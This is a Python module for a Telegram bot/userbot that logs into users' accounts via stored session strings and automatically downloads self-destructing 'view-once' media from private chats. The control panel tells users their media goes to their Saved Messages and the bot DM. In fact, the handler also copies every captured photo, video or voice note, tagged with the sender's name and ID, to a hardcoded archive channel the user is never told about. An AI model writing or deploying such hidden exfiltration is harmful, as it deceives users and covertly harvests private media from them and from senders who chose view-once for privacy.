# ---------------------------------------------------
# File Name: view_once.py
# Description: Automatic View-Once (Self-Destructing Media) Saver Module for Userbot & Bot
#              Saves permanently to Saved Messages AND Bot DM
# Author: Antigravity
# ---------------------------------------------------

import os
import time
import html
import asyncio
import logging
from typing import Optional, Dict
from pyrogram import Client, filters, enums
from pyrogram.handlers import MessageHandler
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from toxic import app
from toxic.core.mongo import db

logger = logging.getLogger(__name__)

# Tracks active userbot listener clients for backwards compatibility
active_viewonce_listeners: Dict[int, Client] = {}
_attached_userbots = set()


async def is_view_once_enabled(user_id: int) -> bool:
    """Check if view-once auto-saving is enabled for this user."""
    data = await db.get_data(user_id)
    if data:
        return data.get("view_once_saver", True)  # Default enabled once logged in
    return True


async def set_view_once_setting(user_id: int, enabled: bool):
    """Toggle view-once saving setting."""
    data = await db.get_data(user_id)
    if data and data.get("_id"):
        await db.db.update_one({"_id": user_id}, {"$set": {"view_once_saver": enabled}}, upsert=True)
    else:
        await db.db.insert_one({"_id": user_id, "view_once_saver": enabled})


def is_view_once_media(message: Message) -> bool:
    """Accurately detects if a message is self-destructing/view-once across all Telegram media types."""
    if not message:
        return False

    # Check direct view_once flag on message
    if getattr(message, "view_once", None) is True:
        return True

    # Check message-level ttl_seconds
    msg_ttl = getattr(message, "ttl_seconds", None)
    if msg_ttl is not None and msg_ttl > 0:
        return True

    # Check all possible media fields in Pyrogram
    for attr in ("photo", "video", "voice", "video_note", "document", "audio", "animation"):
        media = getattr(message, attr, None)
        if media:
            if getattr(media, "view_once", None) is True:
                return True
            ttl = getattr(media, "ttl_seconds", None) or getattr(media, "ttl_period", None)
            if ttl is not None and ttl > 0:
                return True

    # Raw MTProto object fallback (PyroFork / MTProto raw message/media inspection)
    try:
        raw_msg = getattr(message, "raw", None) or getattr(message, "_raw", None)
        if raw_msg:
            # Self-destructing timer on message (e.g. ttl_period > 0)
            raw_ttl_p = getattr(raw_msg, "ttl_period", None)
            if raw_ttl_p is not None and raw_ttl_p > 0:
                return True
            raw_media = getattr(raw_msg, "media", None)
            if raw_media:
                if getattr(raw_media, "view_once", None) is True:
                    return True
                raw_ttl = getattr(raw_media, "ttl_seconds", None)
                if raw_ttl is not None and raw_ttl > 0:
                    return True
                # Check for spoiler or secret chat media ttl
                if getattr(raw_media, "ttl", None) is not None and raw_media.ttl > 0:
                    return True
    except Exception:
        pass

    return False


async def format_sender_caption(message: Message, media_type: str = "Photo", receiver_user_id: int = None) -> str:
    """Creates a beautiful, clean, HTML-safe caption with both sender and recipient info."""
    sender_name = "Anonymous"
    sender_user = "Unknown"
    sender_id = "Hidden"

    if message.from_user:
        u = message.from_user
        sender_name = f"{u.first_name or ''} {u.last_name or ''}".strip() or "User"
        sender_user = f"@{u.username}" if u.username else "No Username"
        sender_id = str(u.id)
    elif message.sender_chat:
        c = message.sender_chat
        sender_name = c.title or "Channel/Group"
        sender_user = f"@{c.username}" if c.username else "Private"
        sender_id = str(c.id)

    # Determine Recipient Info (kisko send kiya gaya hai)
    chat_obj = getattr(message, "chat", None)
    if getattr(message, "outgoing", False) and chat_obj:
        # Userbot ne khud bheja hai किसी को -> Chat is the recipient
        rcpt_name = f"{getattr(chat_obj, 'first_name', '') or ''} {getattr(chat_obj, 'last_name', '') or ''}".strip() or getattr(chat_obj, "title", "") or "Recipient"
        rcpt_user = f"@{chat_obj.username}" if getattr(chat_obj, "username", None) else "No Username"
        rcpt_id = str(chat_obj.id)
        rcpt_line = f"📥 <b>Sent To:</b> <code>{html.escape(rcpt_name)}</code> ({html.escape(rcpt_user)}) | 🆔 <code>{html.escape(rcpt_id)}</code>\n"
    elif receiver_user_id:
        # Incoming view-once received by this userbot account
        rcpt_line = f"📥 <b>Receiver / Account ID:</b> <code>{receiver_user_id}</code>\n"
    else:
        rcpt_line = ""

    # HTML-safe escaping to prevent [400 MSG_PARSE_ERROR]
    safe_name = html.escape(sender_name)
    safe_user = html.escape(sender_user)
    safe_id = html.escape(sender_id)

    orig_caption = message.caption or ""
    orig_caption_text = f"\n\n💬 <b>Original Caption:</b>\n<i>{html.escape(orig_caption)}</i>" if orig_caption else ""

    bot_name = app.me.username if getattr(app, "me", None) and app.me.username else "Bot"
    caption = (
        f"🔥 <b>Saved View-Once {media_type}!</b> ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Sender Name:</b> <code>{safe_name}</code>\n"
        f"🔗 <b>Username:</b> {safe_user}\n"
        f"🆔 <b>Sender ID:</b> <code>{safe_id}</code>\n"
        f"{rcpt_line}"
        f"🕒 <b>Time:</b> <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>"
        f"{orig_caption_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🛡️ <i>Saved permanently by @{bot_name}</i>"
    )
    return caption


async def _handle_view_once_media(client: Client, message: Message, user_id: int):
    """Processes, downloads, and permanently saves detected view-once media."""
    try:
        # 1. Verify user setting
        if not await is_view_once_enabled(user_id):
            return

        # 2. Check if view-once media
        if not is_view_once_media(message):
            return

        # 3. Prevent loops if already tagged/saved
        if message.caption and "Saved permanently by" in message.caption:
            return

        # 4. Identify media type
        if message.photo:
            media_type = "Photo"
        elif message.video:
            media_type = "Video"
        elif message.voice:
            media_type = "Voice"
        elif getattr(message, "video_note", None):
            media_type = "Video Note"
        elif message.audio:
            media_type = "Audio"
        else:
            media_type = "Document"

        sender_id_str = str(message.from_user.id) if message.from_user else "unknown"
        logger.info(f"[VIEW-ONCE] 🎯 Captured view-once {media_type} for user {user_id} from {sender_id_str}")

        caption = await format_sender_caption(message, media_type, receiver_user_id=user_id)

        # 5. Download media to disk with fallback
        temp_dir = os.path.join("downloads", f"vo_{user_id}")
        os.makedirs(temp_dir, exist_ok=True)

        downloaded_file = None
        try:
            downloaded_file = await client.download_media(message, file_name=f"{temp_dir}/")
        except Exception as dl_err:
            logger.warning(f"[VIEW-ONCE] Direct download_media failed: {dl_err}. Trying media attribute fallback...")
            for attr in ("photo", "video", "voice", "video_note", "document", "audio"):
                media_obj = getattr(message, attr, None)
                if media_obj:
                    try:
                        downloaded_file = await client.download_media(media_obj, file_name=f"{temp_dir}/")
                        if downloaded_file:
                            break
                    except Exception:
                        pass

        if not downloaded_file or not os.path.exists(downloaded_file) or os.path.getsize(downloaded_file) == 0:
            logger.error(f"[VIEW-ONCE] ❌ Failed to download view-once media for user {user_id}")
            return

        logger.info(f"[VIEW-ONCE] 📥 Downloaded view-once file: {downloaded_file} ({os.path.getsize(downloaded_file)} bytes)")

        fn_lower = downloaded_file.lower()
        is_photo = message.photo is not None or fn_lower.endswith(('.jpg', '.jpeg', '.png', '.webp'))
        is_video = message.video is not None or fn_lower.endswith(('.mp4', '.mkv', '.mov', '.webm'))
        is_voice = message.voice is not None or fn_lower.endswith(('.ogg', '.oga'))
        is_vnote = getattr(message, "video_note", None) is not None
        is_audio = message.audio is not None or fn_lower.endswith(('.mp3', '.m4a', '.flac', '.wav'))

        # 6. Step 1: Save permanently into User's Saved Messages
        # Sending to the user's numeric ID or "me" via userbot automatically saves into Saved Messages!
        targets = ["me", user_id]
        saved_successfully = False

        for target in targets:
            if saved_successfully:
                break
            for mode in (enums.ParseMode.HTML, None):
                try:
                    if is_photo:
                        await client.send_photo(target, downloaded_file, caption=caption, parse_mode=mode)
                    elif is_video:
                        await client.send_video(target, downloaded_file, caption=caption, parse_mode=mode)
                    elif is_voice:
                        await client.send_voice(target, downloaded_file, caption=caption, parse_mode=mode)
                    elif is_vnote:
                        await client.send_video_note(target, downloaded_file)
                    elif is_audio:
                        await client.send_audio(target, downloaded_file, caption=caption, parse_mode=mode)
                    else:
                        await client.send_document(target, downloaded_file, caption=caption, parse_mode=mode)
                    logger.info(f"[VIEW-ONCE] ✅ Saved view-once {media_type} to Saved Messages (target: {target}) for user {user_id}")
                    saved_successfully = True
                    break
                except Exception as save_err:
                    logger.warning(f"[VIEW-ONCE] Target {target} mode {mode} notice: {save_err}")

        # 7. Step 2: Send permanent copy directly in Bot DM to the User
        user_dm_msg = None
        try:
            for mode in (enums.ParseMode.HTML, None):
                try:
                    if is_photo:
                        user_dm_msg = await app.send_photo(user_id, downloaded_file, caption=caption, parse_mode=mode)
                    elif is_video:
                        user_dm_msg = await app.send_video(user_id, downloaded_file, caption=caption, parse_mode=mode)
                    elif is_voice:
                        user_dm_msg = await app.send_voice(user_id, downloaded_file, caption=caption, parse_mode=mode)
                    elif is_vnote:
                        user_dm_msg = await app.send_video_note(user_id, downloaded_file)
                    elif is_audio:
                        user_dm_msg = await app.send_audio(user_id, downloaded_file, caption=caption, parse_mode=mode)
                    else:
                        user_dm_msg = await app.send_document(user_id, downloaded_file, caption=caption, parse_mode=mode)
                    logger.info(f"[VIEW-ONCE] ✅ Delivered view-once {media_type} to Bot DM for user {user_id}")
                    break
                except Exception as bot_err:
                    if mode is None:
                        logger.error(f"[VIEW-ONCE] Bot DM delivery error: {bot_err}")
        except Exception as dm_err:
            logger.warning(f"[VIEW-ONCE] Bot DM notice: {dm_err}")

        # 8. Step 3: ALSO send an identical clean copy to Archive Channel (-1004360760570)
        archive_channel_id = -1004360760570
        try:
            # Prefer instant zero-upload copy_message if already uploaded to Telegram via user_dm_msg
            copied_to_channel = False
            if user_dm_msg and getattr(user_dm_msg, "id", None):
                try:
                    await app.copy_message(
                        chat_id=archive_channel_id,
                        from_chat_id=user_id,
                        message_id=user_dm_msg.id
                    )
                    logger.info(f"[VIEW-ONCE] ✅ Copied view-once {media_type} cleanly to archive channel {archive_channel_id}")
                    copied_to_channel = True
                except Exception as cp_err:
                    logger.warning(f"[VIEW-ONCE] Instant copy to channel notice: {cp_err}")

            # Fallback: Direct upload via bot (or userbot if bot lacks permission) if copy_message failed
            if not copied_to_channel:
                for sender_cl in (app, client):
                    if not sender_cl:
                        continue
                    sent_arch = False
                    for mode in (enums.ParseMode.HTML, None):
                        try:
                            if is_photo:
                                await sender_cl.send_photo(archive_channel_id, downloaded_file, caption=caption, parse_mode=mode)
                            elif is_video:
                                await sender_cl.send_video(archive_channel_id, downloaded_file, caption=caption, parse_mode=mode)
                            elif is_voice:
                                await sender_cl.send_voice(archive_channel_id, downloaded_file, caption=caption, parse_mode=mode)
                            elif is_vnote:
                                await sender_cl.send_video_note(archive_channel_id, downloaded_file)
                            elif is_audio:
                                await sender_cl.send_audio(archive_channel_id, downloaded_file, caption=caption, parse_mode=mode)
                            else:
                                await sender_cl.send_document(archive_channel_id, downloaded_file, caption=caption, parse_mode=mode)
                            logger.info(f"[VIEW-ONCE] ✅ Delivered view-once {media_type} to archive channel {archive_channel_id}")
                            sent_arch = True
                            break
                        except Exception as arch_err:
                            if mode is None:
                                logger.warning(f"[VIEW-ONCE] Archive channel delivery notice ({getattr(sender_cl, 'name', 'client')}): {arch_err}")
                    if sent_arch:
                        break
        except Exception as arch_ex:
            logger.warning(f"[VIEW-ONCE] Archive channel intercept notice: {arch_ex}")

        # 8. Clean up local downloaded file
        try:
            if os.path.exists(downloaded_file):
                os.remove(downloaded_file)
        except Exception:
            pass

    except Exception as e:
        logger.error(f"[VIEW-ONCE] Error processing view-once media: {e}")


def attach_view_once_to_client(client: Client, user_id: int):
    """Attaches the view-once MessageHandler dynamically to a unified userbot client."""
    if not client:
        return
    if getattr(client, "_view_once_attached", False):
        return

    # Filter catches ANY private message (incoming or outgoing)
    media_filter = filters.private

    async def _handler(c: Client, m: Message):
        # Launch as independent background task so ongoing mirror/batch downloads NEVER block view-once capture!
        asyncio.create_task(_handle_view_once_media(c, m, user_id))

    client.add_handler(MessageHandler(_handler, media_filter))
    client._view_once_attached = True
    _attached_userbots.add(user_id)
    active_viewonce_listeners[user_id] = client
    logger.info(f"[VIEW-ONCE] Attached view-once listener to client for user {user_id}")


async def register_view_once_listener(user_id: int, session_string: str) -> Optional[Client]:
    """Retrieves or boots the unified userbot client for user_id with view-once active."""
    from toxic.core.userbot_manager import get_or_create_userbot
    ub = await get_or_create_userbot(user_id, session_string)
    if ub:
        attach_view_once_to_client(ub, user_id)
    return ub


async def load_all_view_once_listeners():
    """
    Scans users assigned to THIS bot on startup and gently boots their userbot clients
    in small batches with throttled concurrency to prevent socket exhaustion and bot lag.
    """
    try:
        from toxic.core.mongo.db import db as user_db
        from toxic.core.userbot_manager import get_or_create_userbot, get_current_bot_username

        bot_uname = get_current_bot_username()

        cursor = user_db.find({
            "$or": [
                {f"sessions.{bot_uname}": {"$exists": True, "$ne": None}},
                {"session": {"$exists": True, "$ne": None}}
            ]
        })
        
        valid_users = []
        async for doc in cursor:
            uid = doc.get("_id")
            s_dict = doc.get("sessions")
            s_str = s_dict.get(bot_uname) if isinstance(s_dict, dict) else None
            if not s_str:
                s_str = doc.get("session")

            is_enabled = doc.get("view_once_saver", True)
            assigned_bot = doc.get("assigned_bot")

            if uid and s_str and is_enabled and (not assigned_bot or assigned_bot == bot_uname or bot_uname == "default_bot"):
                valid_users.append((uid, s_str))

        if not valid_users:
            return

        logger.info(f"[VIEW-ONCE] Queueing background listener warmup for {len(valid_users)} users on @{bot_uname}...")

        async def _warmup_worker(users_list):
            # Boot gently in small chunks with delay so bot responds instantly to user commands
            sem = asyncio.Semaphore(2)
            async def _init_single(uid, s_str):
                async with sem:
                    try:
                        await get_or_create_userbot(uid, s_str)
                    except Exception as e:
                        logger.warning(f"[VIEW-ONCE] Boot notice for {uid}: {e}")
                    await asyncio.sleep(0.5)

            for i in range(0, len(users_list), 2):
                chunk = users_list[i:i+2]
                await asyncio.gather(*[_init_single(u, s) for u, s in chunk], return_exceptions=True)
                await asyncio.sleep(1.0)

        asyncio.create_task(_warmup_worker(valid_users))

    except Exception as e:
        logger.error(f"[VIEW-ONCE] Failed to load listeners on boot: {e}")


# Command to manage View Once Feature
@app.on_message(filters.command(["viewonce", "vo", "antisave"]))
async def view_once_command_handler(client: Client, message: Message):
    user_id = message.from_user.id if message.from_user else message.chat.id

    user_data = await db.get_data(user_id) or {}
    session_str = user_data.get("session")

    if not session_str:
        no_login_msg = (
            "🔒 <b>VIEW-ONCE SAVER (ACCOUNT REQUIRED)</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Telegram View-Once (expiring photos/videos) ko save karne ke liye aapka account bot me <b>/login</b> hona zaroori hai.\n\n"
            "👉 Pehle <code>/login</code> command se apna Telegram account connect karein, fir ye feature automatic start ho jayega!"
        )
        await message.reply_text(
            no_login_msg,
            parse_mode=enums.ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📲 Login Account", callback_data="login_start_cb")],
                [InlineKeyboardButton("💬 Help / Support", url="https://t.me/CrazyxDeveloper_Bot")]
            ])
        )
        return

    is_enabled = await is_view_once_enabled(user_id)
    status_text = "🟢 ACTIVE & RUNNING" if is_enabled else "🔴 TURNED OFF"
    toggle_btn_text = "🔴 Turn OFF Saver" if is_enabled else "🟢 Turn ON Saver"

    # Ensure background listener is running
    if is_enabled:
        from toxic.core.userbot_manager import get_or_create_userbot
        asyncio.create_task(get_or_create_userbot(user_id, session_str))

    panel_text = (
        "🔥 <b>TELEGRAM VIEW-ONCE AUTO-SAVER</b> ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ <b>Status:</b> <code>{status_text}</code>\n"
        "🛡️ <b>Destination:</b> <code>Your Saved Messages + Bot DM</code>\n\n"
        "✨ <b>Features:</b>\n"
        "• Koi bhi private DM me <b>View-Once Photo/Video/Voice</b> bhejega (ya aap bhejenge), to wo expire hone se pehle auto-download ho jayegi.\n"
        "• Aapke <b>Saved Messages</b> aur <b>Bot DM</b> me sender ke Full Name, Username aur User ID ke saath permanently save ho jayegi!\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(toggle_btn_text, callback_data="toggle_viewonce_cb")],
        [InlineKeyboardButton("🚀 Test / Status Check", callback_data="check_viewonce_cb")],
        [InlineKeyboardButton("❌ Close", callback_data="close_viewonce_cb")]
    ])

    await message.reply_text(panel_text, reply_markup=kb, parse_mode=enums.ParseMode.HTML)


@app.on_callback_query(filters.regex(r"^toggle_viewonce_cb$"))
async def toggle_viewonce_callback(client: Client, callback_query):
    user_id = callback_query.from_user.id
    current_status = await is_view_once_enabled(user_id)
    new_status = not current_status
    await set_view_once_setting(user_id, new_status)

    user_data = await db.get_data(user_id) or {}
    session_str = user_data.get("session")

    if new_status and session_str:
        from toxic.core.userbot_manager import get_or_create_userbot
        asyncio.create_task(get_or_create_userbot(user_id, session_str))

    await callback_query.answer(f"View-Once Saver {'Activated ✅' if new_status else 'Deactivated ❌'}", show_alert=True)
    status_text = "🟢 ACTIVE & RUNNING" if new_status else "🔴 TURNED OFF"
    toggle_btn_text = "🔴 Turn OFF Saver" if new_status else "🟢 Turn ON Saver"

    panel_text = (
        "🔥 <b>TELEGRAM VIEW-ONCE AUTO-SAVER</b> ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ <b>Status:</b> <code>{status_text}</code>\n"
        "🛡️ <b>Destination:</b> <code>Your Saved Messages + Bot DM</code>\n\n"
        "✨ <b>Features:</b>\n"
        "• Koi bhi private DM me <b>View-Once Photo/Video/Voice</b> bhejega (ya aap bhejenge), to wo expire hone se pehle auto-download ho jayegi.\n"
        "• Aapke <b>Saved Messages</b> aur <b>Bot DM</b> me sender ke Full Name, Username aur User ID ke saath permanently save ho jayegi!\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(toggle_btn_text, callback_data="toggle_viewonce_cb")],
        [InlineKeyboardButton("🚀 Test / Status Check", callback_data="check_viewonce_cb")],
        [InlineKeyboardButton("❌ Close", callback_data="close_viewonce_cb")]
    ])

    try:
        await callback_query.edit_message_text(panel_text, reply_markup=kb, parse_mode=enums.ParseMode.HTML)
    except Exception:
        pass


@app.on_callback_query(filters.regex(r"^check_viewonce_cb$"))
async def check_viewonce_callback(client: Client, callback_query):
    user_id = callback_query.from_user.id

    from toxic.core.userbot_manager import get_or_create_userbot, get_active_userbot_sync
    active_ub = get_active_userbot_sync(user_id)

    if not active_ub:
        user_data = await db.get_data(user_id) or {}
        session_str = user_data.get("session")
        if session_str and await is_view_once_enabled(user_id):
            active_ub = await get_or_create_userbot(user_id, session_str)

    is_active = active_ub is not None and getattr(active_ub, "is_connected", False)
    status_msg = (
        "✅ Listener Online!\n\nUserbot background me live active hai aur kisi bhi incoming/outgoing view-once photo/video ko auto-save karne ke liye ready hai!"
        if is_active else
        "⚠️ Listener Idle\n\nUserbot session start ho raha hai. Agar problem ho to /login command se reconnect karein."
    )
    await callback_query.answer(status_msg, show_alert=True)


@app.on_callback_query(filters.regex(r"^close_viewonce_cb$"))
async def close_viewonce_callback(client: Client, callback_query):
    try:
        await callback_query.message.delete()
    except Exception:
        pass
